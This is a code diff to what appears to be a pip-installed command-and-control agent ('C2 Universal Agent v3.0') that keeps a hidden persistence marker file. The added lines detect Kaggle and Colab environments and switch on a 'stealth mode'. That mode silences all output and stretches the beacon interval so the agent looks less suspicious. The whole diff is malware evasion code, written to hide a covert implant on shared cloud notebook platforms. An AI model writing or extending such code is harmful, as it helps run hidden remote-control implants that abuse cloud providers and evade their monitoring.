@@ -34,6 +34,11 @@ AUTH_TOKEN = os.environ.get("AUTH_TOKEN", "")
 DEBUG    = os.environ.get("C2_DEBUG",  "1")  # Enable debug by default
 QUIET_MODE = True  # After registration, only log to file (not stdout)
 
+# Kaggle/Colab stealth settings
+KAGGLE_QUIET = os.environ.get("KAGGLE_KERNEL_RUN_TYPE", "") != ""  # Auto-detect Kaggle
+COLAB_QUIET = "colab.google" in os.environ.get("PYTHONPATH", "").lower()  # Auto-detect Colab
+STEALTH_MODE = KAGGLE_QUIET or COLAB_QUIET  # Enable stealth on cloud platforms
+
 # Persistence marker file
 PERSIST_MARKER = Path.home() / ".cache" / ".system_services" / ".agent_initialized"
 
@@ -787,6 +792,15 @@ class UniversalAgent:
 def main():
     """Entry point for pip-installed agent."""
     import random
+    
+    # Stealth mode for Kaggle/Colab - minimal output
+    if STEALTH_MODE:
+        # On cloud platforms, go completely silent
+        global _stdout_enabled
+        _stdout_enabled = False
+        # Longer beacon interval on cloud (less suspicious)
+        global SLEEP
+        SLEEP = max(SLEEP, 60)  # At least 60s between beacons on cloud
     
     log("=" * 60, "START")
     log("C2 Universal Agent v3.0 - Starting", "START")
